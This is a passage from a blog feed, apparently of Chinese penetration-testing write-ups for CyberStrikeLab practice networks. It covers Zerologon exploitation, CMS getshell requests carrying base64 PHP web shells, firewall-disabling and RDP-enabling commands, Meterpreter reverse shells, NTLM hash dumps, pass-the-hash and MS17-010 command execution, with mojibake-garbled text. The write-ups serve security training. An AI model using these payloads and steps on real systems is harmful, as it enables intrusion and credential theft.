![image.png](/post-images/CyberstrikelabLab3/image13.png)

`fscan` æ‰«æ

```php
C:\>fscan.exe -h 192.168.20.30 -nobr
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚
â”‚  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚
â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   <     â”‚
â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: 2.0.0

[2025-08-12 15:21:41] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1
[2025-08-12 15:21:41] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ
[2025-08-12 15:21:41] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1
[2025-08-12 15:21:42] [INFO] å¼€å§‹ä¸»æœºæ‰«æ
[2025-08-12 15:21:42] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233
[2025-08-12 15:21:42] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:445
[2025-08-12 15:21:42] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:389
[2025-08-12 15:21:42] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:139
[2025-08-12 15:21:42] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:135
[2025-08-12 15:21:42] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:88
[2025-08-12 15:21:47] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:445 => 
[2025-08-12 15:21:47] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:139 =>  Banner:[.]
[2025-08-12 15:21:47] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:88 => 
[2025-08-12 15:21:52] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:389 => 
[2025-08-12 15:22:47] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:135 => 
[2025-08-12 15:22:47] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 5
[2025-08-12 15:22:47] [INFO] å¼€å§‹æ¼æ´æ‰«æ
[2025-08-12 15:22:47] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle
[2025-08-12 15:22:47] [SUCCESS] NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: 192.168.20.30
ä¸»æœºå: WIN-7NRTJO59O7N
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ 192.168.20.30
[2025-08-12 15:22:48] [SUCCESS] æ‰«æå·²å®Œæˆ: 9/9
```

å°è¯• `SMB` åŒ¿å

```php
âœ  fscan proxychains -q nxc smb 192.168.20.30 -u anonymous -p ''
SMB         192.168.20.30   445    WIN-7NRTJO59O7N  [*] Windows 6.1 Build 7600 x64 (name:WIN-7NRTJO59O7N) (domain:cyberstrikelab.com) (signing:True) (SMBv1:False) 
SMB         192.168.20.30   445    WIN-7NRTJO59O7N  [-] cyberstrikelab.com\anonymous: STATUS_LOGON_FAILURE
```

æ²¡ä»€ä¹ˆå‘ç°çš„ï¼Œå°è¯•ä¸€ä¸‹å…¬å¼€æ¼æ´ï¼Œæµ‹è¯•ä¸€ä¸‹ `zerologon`

### zerologon

> POCï¼šhttps://github.com/SecuraBV/CVE-2020-1472
> 

```php
âœ  CVE-2020-1472 git:(master) proxychains -q python zerologon_tester.py WIN-7NRTJO59O7N 192.168.20.30
Performing authentication attempts...
==============================================================================
Success! DC can be fully compromised by a Zerologon attack
```

å†åˆ©ç”¨ exp

> https://github.com/dirkjanm/CVE-2020-1472
> 

```php
âœ  CVE-2020-1472-master proxychains -q python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30
Performing authentication attempts...
=====================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

ç„¶åç›´æ¥ `Dumphash`

![image.png](/post-images/CyberstrikelabLab3/image14.png)

`PTH`

![image.png](/post-images/CyberstrikelabLab3/image15.png)

è¯»å– flag

```php
C:\Windows\system32> type C:\flag.txt
go-flag{ueoJt7eB6AQL8OpL}
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>Cyberstrikelab</category>
            <category>Windows</category>
            <category>taoCMS</category>
            <category>å¤šå±‚å†…ç½‘</category>
            <category>zerologon</category>
        </item>
        <item>
            <title><![CDATA[Cyberstrikelab - Lab2]]></title>
            <link>https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab2</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab2</guid>
            <pubDate>Tue, 12 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Lab2 https://www.cyberstrikelab.com/#/scene/detail/21 192.168.10.10 Recon ç«¯å£æ‰«æ 808 æ˜¯ web æœåŠ¡ éª‘å£« CMS è®¿é—® 808 ç«¯å£ åœ¨é¡µå°¾ä¸­èƒ½æ‰¾åˆ° Powered by 74cms v4.2.111 é€šè¿‡æœå¯»ï¼Œå­˜åœ¨...]]></description>
            <content:encoded><![CDATA[
# Lab2

> https://www.cyberstrikelab.com/#/scene/detail/21
> 

## 192.168.10.10

### Recon

ç«¯å£æ‰«æ

```php
âœ  Lab2 nmap -sT -min-rate 5000 -p- 192.168.10.10                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 18:36 CST
Nmap scan report for 192.168.10.10
Host is up (0.053s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
808/tcp   open  ccproxy-http
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```

`808` æ˜¯ `web` æœåŠ¡

```php
âœ  Lab2 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 18:37 CST
Stats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.86% done; ETC: 18:40 (0:00:10 remaining)
Nmap scan report for 192.168.10.10
Host is up (0.054s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
808/tcp   open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
|_http-title: \xE9\xAA\x91\xE5\xA3\xABPHP\xE9\xAB\x98\xE7\xAB\xAF\xE4\xBA\xBA\xE6\x89\x8D\xE7\xB3\xBB\xE7\xBB\x9F(www.74cms.com)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
3306/tcp  open  mysql         MySQL (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 21H1 (92%), Microsoft Windows 10 1903 (92%), Microsoft Windows 10 21H2 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-08-12T02:40:41
|_  start_date: N/A
|_clock-skew: -8h00m00s

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   53.19 ms 172.16.233.1
2   53.32 ms 192.168.10.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.60 seconds
```

### éª‘å£« CMS

è®¿é—® `808` ç«¯å£

![image.png](/post-images/CyberstrikelabLab2/image.png)

åœ¨é¡µå°¾ä¸­èƒ½æ‰¾åˆ° `Powered by 74cms v4.2.111` 

é€šè¿‡æœå¯»ï¼Œå­˜åœ¨åå° `getshell` 

å…ˆæµ‹è¯•æ˜¯å¦å­˜åœ¨å¼±å¯†ç ï¼Œåå°é¡µé¢ï¼š`http://192.168.10.10:808/index.php?m=admin&c=index&a=login`

é€šè¿‡å¼±å¯†ç  `admin`:`admin123456` è¿›å…¥åå°

![image.png](/post-images/CyberstrikelabLab2/image1.png)

> åˆ©ç”¨é“¾æ¥ï¼šhttps://blog.csdn.net/m0_63253040/article/details/127041028
> 

![image.png](/post-images/CyberstrikelabLab2/image2.png)

ç„¶åè®¿é—® `/Application/Home/Conf/config.php`

![image.png](/post-images/CyberstrikelabLab2/image3.png)

åå¼¹ `shell`

![image.png](/post-images/CyberstrikelabLab2/image4.png)

![image.png](/post-images/CyberstrikelabLab2/image5.png)

ä¸Šçº¿ `Vshell` 

é¦–å…ˆå°†é˜²ç«å¢™å’Œè¿œç¨‹æ¡Œé¢æ‰“å¼€

```php
PS C:\phpstudy_pro\WWW\Application\Home\Conf> REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
The operation completed successfully.

PS C:\phpstudy_pro\WWW\Application\Home\Conf> netsh advfirewall set allprofiles state off
Ok.
```

é€šè¿‡ä¸€é”®ä¸Šçº¿å‘½ä»¤ä¸Šçº¿ï¼Œä¼ `payload` ä¹Ÿå¯ä»¥

![image.png](/post-images/CyberstrikelabLab2/image6.png)

### ä¿¡æ¯æ”¶é›†

è¯»å–ç¬¬ä¸€ä¸ª `flag.txt`

```php
C:\>type flag.txt
go-flag{MP9E4xXhya0TlzVF}
```

`IP` ä¿¡æ¯ï¼Œå¾ˆå¥‡æ€ªï¼Œä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ªç½‘ç»œ

```php
C:\>ipconfig

Windows IP é…ç½®

ä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘å®ä¾‹ 0:

   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :
   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::81d8:7722:88a0:5578%12
   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.10.10
   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0
   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.10.233
```

æˆ‘ä¹ˆå¯¹ç½‘æ®µæ®µè¿›è¡Œæ‰«æï¼Œå­˜åœ¨ä¸‰å°æœºå­

```php
âœ  Lab2 nmap -sn 192.168.10.0/24                                                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 19:01 CST
Nmap scan report for 192.168.10.10
Host is up (0.056s latency).
Nmap scan report for 192.168.10.20
Host is up (0.058s latency).
Nmap scan report for 192.168.10.233
Host is up (0.061s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.37 seconds
```

`Fscan` æ‰«æä¸€ä¸‹

```php
âœ  fscan ./fscan_1.8.4 -h 192.168.10.1-255

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 192.168.10.10   is alive
(icmp) Target 192.168.10.20   is alive
(icmp) Target 192.168.10.233  is alive
[*] Icmp alive hosts len is: 3
192.168.10.10:139 open
192.168.10.20:135 open
192.168.10.10:3306 open
192.168.10.10:135 open
192.168.10.233:22 open
192.168.10.20:445 open
192.168.10.20:139 open
192.168.10.10:445 open
192.168.10.20:8080 open
192.168.10.10:7680 open
192.168.10.233:8080 open
192.168.10.10:808 open
192.168.10.20:8009 open
[*] alive ports len is: 13
start vulscan
[*] NetInfo 
[*]192.168.10.10
   [->]DESKTOP-JFB57A8
   [->]192.168.10.10
[*] WebTitle https://192.168.10.233:8080 code:404 len:19     title:None
[*] NetBios 192.168.10.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600
[*] WebTitle http://192.168.10.20:8080 code:200 len:11432  title:Apache Tomcat/8.5.19
[*] WebTitle http://192.168.10.10:808  code:404 len:1331   title:ç³»ç»Ÿå‘ç”Ÿé”™è¯¯
[+] PocScan http://192.168.10.20:8080 poc-yaml-iis-put-getshell 
[+] PocScan http://192.168.10.20:8080 poc-yaml-tomcat-cve-2017-12615-rce 
```

`192.168.10.20` æ‰«æå‡ºæ¥ä¸¤ä¸ªæ´

## 192.168.10.20

### cve-2017-12615

è®¿é—® `8080` ç«¯å£

![image.png](/post-images/CyberstrikelabLab2/image7.png)

ä¹‹å‰åœ¨ `Fscan` æ‰«æå‡ºæ¥ `cve-2017-12615`

> https://www.cnblogs.com/confidant/p/15440233.html
> 

![image.png](/post-images/CyberstrikelabLab2/image8.png)

è¿ä¸Šå†°è

![image.png](/post-images/CyberstrikelabLab2/image9.png)

### ææƒ

æŸ¥çœ‹æƒé™

```php
C:/Program Files/Apache Software Foundation/Tomcat 8.5/ >whoami /all

ç”¨æˆ·ä¿¡æ¯
----------------

ç”¨æˆ·å                       SID     
============================ ========
nt authority\network service S-1-5-20

ç»„ä¿¡æ¯
-----------------

ç»„å                                   ç±»å‹   SID          å±æ€§                          
====================================== ====== ============ ==============================
Mandatory Label\System Mandatory Level æ ‡ç­¾   S-1-16-16384                               
Everyone                               å·²çŸ¥ç»„ S-1-1-0      å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„
BUILTIN\Users                          åˆ«å   S-1-5-32-545 å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„
NT AUTHORITY\SERVICE                   å·²çŸ¥ç»„ S-1-5-6      å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„
CONSOLE LOGON                          å·²çŸ¥ç»„ S-1-2-1      å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„
NT AUTHORITY\Authenticated Users       å·²çŸ¥ç»„ S-1-5-11     å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„
NT AUTHORITY\This Organization         å·²çŸ¥ç»„ S-1-5-15     å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„
LOCAL                                  å·²çŸ¥ç»„ S-1-2-0      å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„

ç‰¹æƒä¿¡æ¯
----------------------

ç‰¹æƒå                        æè¿°                 çŠ¶æ€  
============================= ==================== ======
SeAssignPrimaryTokenPrivilege æ›¿æ¢ä¸€ä¸ªè¿›ç¨‹çº§ä»¤ç‰Œ   å·²ç¦ç”¨
SeIncreaseQuotaPrivilege      ä¸ºè¿›ç¨‹è°ƒæ•´å†…å­˜é…é¢   å·²ç¦ç”¨
SeAuditPrivilege              ç”Ÿæˆå®‰å…¨å®¡æ ¸         å·²ç¦ç”¨
SeChangeNotifyPrivilege       ç»•è¿‡éå†æ£€æŸ¥         å·²å¯ç”¨
SeImpersonatePrivilege        èº«ä»½éªŒè¯åæ¨¡æ‹Ÿå®¢æˆ·ç«¯ å·²å¯ç”¨
SeCreateGlobalPrivilege       åˆ›å»ºå…¨å±€å¯¹è±¡         å·²å¯ç”¨
SeIncreaseWorkingSetPrivilege å¢åŠ è¿›ç¨‹å·¥ä½œé›†       å·²ç¦ç”¨
```

å¯ä»¥æ‰“ `SweetPotato` ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰“ä¸ä¸Šï¼Œè¿™é‡Œä¸Šçº¿ `MSF` æ¥æ‰“

```php
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 172.16.233.2:4444 
[*] Sending stage (203846 bytes) to 192.168.10.20
[*] Meterpreter session 1 opened (172.16.233.2:4444 -> 192.168.10.20:49220) at 2025-08-12 20:22:41 +0800

meterpreter > getsystem
...got system via technique 4 (Named Pipe Impersonation (RPCSS variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

æˆåŠŸè·å¾— `system` æƒé™

è¯»ç¬¬äºŒä¸ª `flag`

```php
C:\>type flag.txt
go-flag{2a1AygwfTuccnNJY}
```

### ä¿¡æ¯æ”¶é›†

è¿˜æœ‰äºŒå±‚å†…ç½‘

![image.png](/post-images/CyberstrikelabLab2/image10.png)

ä¸Šçº¿ `Vshell` ï¼Œç›´æ¥å¼¹å³å¯

![image.png](/post-images/CyberstrikelabLab2/image11.png)

`Fscan` æ‰«æå‘ç° `192.168.20.30` å­˜åœ¨æ°¸æ’ä¹‹è“ï¼Œè¦èµ°ä»£ç†æ‰“

![image.png](/post-images/CyberstrikelabLab2/image12.png)

å¯ä»¥ç›´æ¥åœ¨ `Vshell` ä¸Šè¿›è¡Œä»£ç†

é€‰æ‹© `192.168.10.20` ç„¶åç‚¹å‡»éš§é“ä»£ç†

![image.png](/post-images/CyberstrikelabLab2/image13.png)

`Kali` è¿æ¥å³å¯

```php
âœ  Lab2 tail -n 1 /etc/proxychains4.conf
socks5  127.0.0.1       2131    admin   admin
âœ  Lab2 proxychains curl 192.168.20.30:8080
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:8080  ...  OK
curl: (52) Empty reply from server
```

## 192.168.20.30

### æ°¸æ’ä¹‹è“

é€šè¿‡ä»£ç†å¯åŠ¨ `MSF`

```php
âœ  Lab2 proxychains -q msfconsole                                                                                                                                      
Metasploit tip: The use command supports fuzzy searching to try and 
select the intended module, e.g. use kerberos/get_ticket or use 
kerberos forge silver ticket
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt

       =[ metasploit v6.4.69-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]
+ -- --=[ 1672 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > 
```

æ‰“ `command` å°±å¥½äº†ï¼Œç›´æ¥è¯» `flag`

```php
msf6 > search ms17
msf6 > use 19
msf6 auxiliary(admin/smb/ms17_010_command) > set command "type C:\flag.txt"
command => type C:\flag.txt
msf6 auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.20.30
rhost => 192.168.20.30
```

![image.png](/post-images/CyberstrikelabLab2/image14.png)]]></content:encoded>
            <category>é¶æœº</category>
            <category>Cyberstrikelab</category>
            <category>Windows</category>
            <category>Tomcat</category>
            <category>Vshell</category>
            <category>å¤šå±‚å†…ç½‘</category>
            <category>MS17_010</category>
        </item>
        <item>
            <title><![CDATA[Cyberstrikelab - Lab1]]></title>
            <link>https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab-1</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab-1</guid>
            <pubDate>Tue, 12 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Lab 1 https://www.cyberstrikelab.com/#/scene/detail/20 Youcms youcms ç½‘ä¸Šèƒ½æ‰¾åˆ° youcms å‰å° getshell çš„åˆ©ç”¨ https://blog.csdn.net/qq 48985780/article/details/12...]]></description>
            <content:encoded><![CDATA[
# Lab-1

> https://www.cyberstrikelab.com/#/scene/detail/20
> 

## Youcms

`youcms`

![image.png](/post-images/CyberstrikelabLab-1/image.png)

ç½‘ä¸Šèƒ½æ‰¾åˆ° `youcms` å‰å° `getshell` çš„åˆ©ç”¨

> https://blog.csdn.net/qq_48985780/article/details/121945304
> 

```php
POST /index.php/api/Uploadify/preview HTTP/1.1
Host: 192.168.10.10
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept-Encoding: gzip, deflate
Sec-GPC: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded

data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
```

è®¿é—®è¿”å›åŒ…ä¸­çš„ `preview/xxxxxxx.php`

![image.png](/post-images/CyberstrikelabLab-1/image1.png)

å†™å…¥ä¸€å¥è¯æœ¨é©¬

```php
POST /index.php/api/Uploadify/preview HTTP/1.1
Host: 192.168.10.10
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept-Encoding: gzip, deflate
Sec-GPC: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded

data:image/php;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsneCddKTs=
```

æµ‹è¯•ï¼Œæ˜¯ `windows`

![image.png](/post-images/CyberstrikelabLab-1/image2.png)

## 192.168.10.10

è¿›è¡Œåå¼¹ `shell`

![image.png](/post-images/CyberstrikelabLab-1/image3.png)

![image.png](/post-images/CyberstrikelabLab-1/image4.png)

å…ˆæŠŠé˜²ç«å¢™å…³äº†ï¼Œç„¶åå¼€å¯è¿œç¨‹æ¡Œé¢

```php
PS C:\phpstudy_pro\WWW\eyoucms1.0\preview> netsh advfirewall set allprofiles state off
Ok.

PS C:\phpstudy_pro\WWW\eyoucms1.0\preview> REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
The operation completed successfully.
```

ä¹‹åå†ä¸Šçº¿ `Vshell` ï¼Œä½¿ç”¨ä¸€é”®ä¸Šçº¿å‘½ä»¤å³å¯

![image.png](/post-images/CyberstrikelabLab-1/image5.png)

`C` ç›˜æ ¹ç›®å½•ç¬¬ä¸€ä¸ª flag

```php
C:\>type flag.txt
go-flag{kn6anDUCzBqtjlX8}
```

è¿™é‡Œä¸ºäº†æ–¹ä¾¿æ‰€ä»¥ä¸Š `MSF` æŠ“äº†ä¸‹ `HASH`

![image.png](/post-images/CyberstrikelabLab-1/image6.png)

è¿™é‡Œå¯ä»¥ä½¿ç”¨ `evil-winrm` è¿›è¡Œç™»é™†äº†

```php
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain           NTLM                              SHA1
--------       ------           ----                              ----
Administrator  WIN-KOHRC1DGOL9  a167976f7bd8d93ee232fa7a87a4079e  8b8bca113dee7e588272b1ca6b73b16d017d4434

wdigest credentials
===================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
Administrator     WIN-KOHRC1DGOL9  (null)
WIN-KOHRC1DGOL9$  WORKGROUP        (null)

kerberos credentials
====================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
Administrator     WIN-KOHRC1DGOL9  (null)
win-kohrc1dgol9$  WORKGROUP        (null)
```

`IP` ä¿¡æ¯

```php
C:\>ipconfig

Windows IP é…ç½®

ä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘ 3:

   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :
   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::f934:2031:ffb0:abe5%17
   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.10.10
   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0
   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.10.233

ä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘å®ä¾‹ 0:

   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :
   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::dd76:17c3:eada:75fb%16
   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.20.10
   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0
   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.20.1

éš§é“é€‚é…å™¨ isatap.{4DA50EBB-5871-4387-AB71-FF1EF08A5B10}:

   åª’ä½“çŠ¶æ€  . . . . . . . . . . . . : åª’ä½“å·²æ–­å¼€
   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :

éš§é“é€‚é…å™¨ isatap.{0A087C82-408A-4C20-8EB3-4E5C11A340D7}:

   åª’ä½“çŠ¶æ€  . . . . . . . . . . . . : åª’ä½“å·²æ–­å¼€
   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :
```

æ‰¾åˆ°å†…ç½‘ç½‘æ®µ `192.168.20.x`

ä¸Šä¼  `fscan` æ‰«æ

```php
PS C:\> ./fscan -h 192.168.20.1-255
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚
â”‚  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚
â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   <     â”‚
â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: 2.0.0

[2025-08-12 07:42:18] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1
[2025-08-12 07:42:18] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ
[2025-08-12 07:42:18] [INFO] ç”ŸæˆIPèŒƒå›´: 192.168.20.1 - 192.168.20.255
[2025-08-12 07:42:18] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 255
[2025-08-12 07:42:18] [INFO] å¼€å§‹ä¸»æœºæ‰«æ
[2025-08-12 07:42:18] [SUCCESS] ç›®æ ‡ 192.168.20.10   å­˜æ´» (ICMP)
[2025-08-12 07:42:19] [SUCCESS] ç›®æ ‡ 192.168.20.20   å­˜æ´» (ICMP)
[2025-08-12 07:42:19] [SUCCESS] ç›®æ ‡ 192.168.20.30   å­˜æ´» (ICMP)
[2025-08-12 07:42:21] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 3
[2025-08-12 07:42:21] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233
[2025-08-12 07:42:21] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:135
[2025-08-12 07:42:21] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:135
[2025-08-12 07:42:21] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:135
[2025-08-12 07:42:21] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:88
[2025-08-12 07:42:21] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:80
[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:445
[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:445
